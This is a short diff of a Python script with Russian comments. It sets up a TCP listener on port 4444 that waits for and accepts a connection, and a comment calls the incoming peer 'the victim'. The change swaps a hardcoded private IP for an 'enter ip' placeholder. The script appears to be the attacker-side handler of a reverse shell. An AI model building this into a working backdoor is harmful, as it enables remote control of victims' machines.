@@ -2,7 +2,7 @@ import socket
 
 listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # создаём объект класса socket
 listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("192.168.1.103", 4444))  # привязываем ip и порт
+listener.bind(("enter ip", 4444))  # привязываем ip и порт
 listener.listen()  # прослушиваем порт
 print("[+]Waiting for connection...\n")
 connection, address = listener.accept()  # как только подключение установленно, получаем адресс жертвы и подключение
